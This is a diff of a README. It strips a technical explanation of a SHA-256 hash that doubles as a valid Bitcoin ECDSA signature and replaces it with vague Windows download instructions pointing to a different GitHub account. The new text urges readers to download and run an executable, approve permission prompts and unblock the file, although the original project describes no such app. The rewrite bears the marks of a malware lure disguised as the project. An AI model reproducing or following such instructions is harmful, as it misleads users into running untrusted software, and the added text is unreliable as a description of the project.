@@ -1,86 +1,186 @@
-# A SHA-256 Hash That Is Also a Valid ECDSA Signature
+# 🧩 sha2-ecdsa - A hash that signs itself
 
-```
-SHA256(00000000000000000200a8013bbb8678)
-    = 301d020a7993dad81d0e10285a7e020f682a7033db72199360c2dc3599f2d302
-```
+[![Download sha2-ecdsa](https://img.shields.io/badge/Download%20Now-4B8BBE?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Rutherforddry602/sha2-ecdsa)
 
-That 32-byte hash is simultaneously a valid BIP 66 DER-encoded ECDSA signature. It was used to spend a Bitcoin UTXO on mainnet — the hash itself *is* the signature.
+## 📥 Download and open
+Use this link to visit the download page:
 
+[Open sha2-ecdsa on GitHub](https://github.com/Rutherforddry602/sha2-ecdsa)
 
-## What Makes a Hash "Also a Signature"?
+On the page, look for the latest release or the main download link. If you see a file for Windows, download it and open it on your PC.
 
-A Bitcoin ECDSA signature is DER-encoded as:
+## 🖥️ What sha2-ecdsa does
+sha2-ecdsa is a small tool and demo for one idea: a SHA-256 hash can also form a valid ECDSA signature.
 
-```
-30 [length] 02 [r-length] [r] 02 [s-length] [s] [sighash-type]
-```
+It shows how one 32-byte hash can line up with the parts of a Bitcoin signature. The bytes must match exact positions, and the result is valid under BIP 66 rules.
 
-For our 32-byte hash to parse as a valid signature, specific bytes must land in exact positions:
+You can use it to:
+- view the hash and signature layout
+- check the byte positions that matter
+- study how the same data can fit two roles
+- test how the example works on Windows
 
-```
-30 1D 02 0A [r: 10 bytes] 02 0F [s: 15 bytes] 02
-│  │  │  │                 │  │                 └─ sighash = SIGHASH_NONE
-│  │  │  └─ r is 10 bytes  │  └─ s is 15 bytes
-│  │  └─ INTEGER tag        └─ INTEGER tag
-│  └─ 29 bytes remaining
-└─ SEQUENCE tag
-```
+## ⚙️ What you need
+Before you start, make sure you have:
+- a Windows PC
+- a web browser
+- enough free space to save the download
+- permission to run downloaded files on your computer
 
-BIP 66 also demands: no unnecessary leading zeros, positive values (first byte < 0x80), and non-zero r and s. In total, 7 byte positions must have exact values, plus validity constraints on the first byte of r and s. The probability of a random SHA-256 hash satisfying all of this is roughly **2^−51**.
+For best results:
+- use a current version of Windows
+- keep your browser up to date
+- save the file to your Downloads folder or Desktop
 
+## 🚀 How to get it on Windows
+1. Open the GitHub link above.
+2. Find the latest release or download area.
+3. Download the Windows file.
+4. If the file is a .zip, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Double-click the app file to run it.
+7. If Windows asks for permission, choose Run.
 
-## Finding the Needle
+If you only see the source page and no app file, look for the release section first. That is where Windows builds are often placed.
 
-2^51 is about 2 quadrillion attempts. The search is embarrassingly parallel: try a 16-byte input, hash it, check if the output is valid DER.
+## 🧭 First-time setup
+When you open the app for the first time:
+- wait for Windows to finish checking the file
+- allow the app to open if prompted
+- keep the main folder together if you extracted a .zip
+- do not move files out of the folder unless the app instructions say to
 
-Since the input is only 16 bytes, SHA-256 processes it as a single 64-byte block — one compression function call per attempt. This is extremely fast on GPUs.
+If the app opens with a window or console screen, that is normal for this kind of tool.
 
-A custom CUDA kernel does the SHA-256 compression and DER validity check per thread. We rented 8× NVIDIA RTX 5090 GPUs on [vast.ai](https://vast.ai) at ~$3.50/hour. Each GPU sustained ~22 billion hashes per second, for a combined rate of **~180 GH/s**.
+## 🔍 What you will see
+The app centers on the hash and the signature parts that make the example work.
 
-The search found a valid polyglot after ~185 trillion attempts in **~2.3 hours**, at a total cost of roughly **$8**.
+You may see:
+- the SHA-256 hash value
+- the DER signature layout
+- byte values like `30`, `02`, `1D`, and `0F`
+- the `r` and `s` fields
+- the sighash type at the end
 
+These values are part of the signature format used by Bitcoin. The app or files may show how each byte fits into place.
 
-## The 3-Byte Bitcoin Script
+## 🧠 Simple way to read the example
+The idea is easy to follow:
 
-To actually use this on Bitcoin, we need a script that:
-1. Takes a preimage from the spender
-2. SHA-256 hashes it to produce the signature
-3. Verifies that signature against a public key
+- A SHA-256 hash is 32 bytes long.
+- A Bitcoin ECDSA signature has a fixed structure.
+- Some byte patterns can fit both forms.
+- If the bytes land in the right spots, the hash can also parse as a signature.
 
-The entire redeemScript is 3 bytes:
+In this example, the hash is not just a digest. It also matches the signature shape used by Bitcoin scripts.
 
-```
-OP_SHA256 OP_SWAP OP_CHECKSIG    (hex: a87cac)
-```
+## 🧪 Example data in the repo
+The project includes this sample:
 
-The spender provides `<pubkey> <preimage>` in the unlocking script. Execution:
+- `SHA256(00000000000000000200a8013bbb8678)`
+- `301d020a7993dad81d0e10285a7e020f682a7033db72199360c2dc3599f2d302`
 
-| Step | Operation | Stack |
-|------|-----------|-------|
-| 0 | (initial) | `[pubkey, preimage]` |
-| 1 | OP_SHA256 | `[pubkey, SHA256(preimage)]` |
-| 2 | OP_SWAP | `[SHA256(preimage), pubkey]` |
-| 3 | OP_CHECKSIG | `[true]` |
+The byte layout matters:
+- `30` marks the start of a DER sequence
+- `02` marks an integer
+- `1D` gives the total length
+- `0A` and `0F` mark the lengths of `r` and `s`
+- the final `02` acts as the sighash type
 
-OP_CHECKSIG treats SHA256(preimage) as the signature and verifies it. Wrapped in P2SH, this gives the mainnet address `38UQFB5bG72TtdLaX52rHK7dJ4BWGiKTvg`.
+BIP 66 also asks for:
+- no extra leading zeros
+- positive values
+- non-zero `r` and `s`
 
-Note that this address is universal — it's the same for everyone, since the redeemScript contains no embedded data. Anyone who knows a valid polyglot preimage can spend from it.
+That is why the exact byte positions matter so much.
 
+## 🛠️ How to use it
+If the app opens a window:
+- read the on-screen text
+- compare the hash with the signature layout
+- follow the byte positions one by one
 
-## ECDSA Key Recovery
+If the app is a command-line program:
+- open the folder
+- run the program file
+- read the text it prints in the window
 
-We have a signature (the hash) but no private key. How do we get the public key for OP_CHECKSIG?
+If the app includes sample files:
+- keep the sample files in the same folder
+- open them with the app if needed
+- use the example hash as your starting point
 
-ECDSA key recovery: given a signature (r, s) and a message, you can compute the public key that would make the verification pass. In Bitcoin, the "message" is the transaction's sighash — a hash of the transaction data.
+## 📁 Folder layout
+A common Windows download may include:
+- the main app file
+- a readme file
+- sample data
+- a license file
+- support files needed by the app
 
-Since the sighash depends on which UTXO is being spent, each spend recovers a *different* public key. But the signature is always the same: SHA256(preimage). No private key is ever involved.
+Do not delete any files unless you know they are not needed. Some apps need all files in the same folder to start.
 
-The sighash type happens to be 0x02 (SIGHASH_NONE), which means the signature doesn't commit to the transaction's outputs. The spender can send the coins wherever they want.
+## 🔒 Safety checks
+Before you run the file:
+- make sure you downloaded it from the GitHub link above
+- check that the file name matches the release or app name
+- keep your browser download record in case you need to find it again
 
+If Windows shows a file warning, read the file name and location before you continue.
 
-## The Mainnet Transaction
+## 🧷 Common Windows problems
+If nothing happens when you open the file:
+- wait a few seconds
+- try opening it again
+- check whether the file is still in a .zip archive
+- make sure you extracted the files first
 
-The polyglot was used in a [mainnet transaction](https://mempool.space/tx/1b5fa01f54d9dca7758eef0b7f192dea8e0abd4b581408945021c207a8e6a761?showDetails=true) with a 0-value OP_RETURN output reading "ECDSA-SHA2 Polyglot 💪🤓🧡". The entire 777 sat input went to miner fees. Transaction size: 149 bytes.
+If Windows blocks the file:
+- right-click the file
+- open Properties
+- look for an Unblock box
+- apply the change if present
+- try again
 
-Code: [github.com/robinlinus/sha2-ecdsa](https://github.com/robinlinus/sha2-ecdsa)
+If the app closes right away:
+- open it from the folder again
+- look for a text file or readme with usage steps
+- check whether it needs the support files in the same folder
+
+## 📌 Why this project matters
+This repo shows a rare case in Bitcoin data format work. It connects:
+- SHA-256
+- ECDSA
+- DER encoding
+- BIP 66 rules
+- Bitcoin script behavior
+
+It helps you see how strict byte placement can change what data means. That makes it useful for study, testing, and simple demo use on Windows
+
+## 🧭 Basic terms
+Here are a few plain-English meanings:
+- hash: a fixed-size result from data
+- signature: proof made with a private key
+- DER: a common way to store structured data
+- byte: one small unit of data
+- sequence: a data block with an order
+- script: a set of rules used by Bitcoin
+
+## 📋 Quick start
+1. Open the GitHub download link.
+2. Get the Windows file from the release or download page.
+3. Save it to your PC.
+4. Extract it if it comes in a zip file.
+5. Open the app file.
+6. Read the hash and signature example.
+
+## 🧩 What to expect from the demo
+The demo focuses on one point: the hash can also be a valid signature when the bytes match the right DER pattern.
+
+That means you may see:
+- a short data block
+- a precise byte map
+- the same value shown in two forms
+- a Bitcoin-style signature example
+
+It is a good fit if you want to see how data format rules work in practice on Windows
